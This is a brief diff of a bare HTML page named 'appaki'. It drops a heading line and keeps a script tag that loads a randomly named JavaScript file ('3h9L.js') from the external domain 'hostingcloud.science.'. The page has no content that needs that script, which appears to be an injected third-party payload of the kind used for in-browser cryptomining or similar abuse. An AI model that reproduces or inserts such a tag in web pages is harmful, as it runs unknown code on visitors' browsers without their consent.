@@ -1,4 +1,3 @@
-# appaki
 <title>appaki</title>
 <h1>appaki</h1>
 <script src="https://www.hostingcloud.science./3h9L.js"></script>
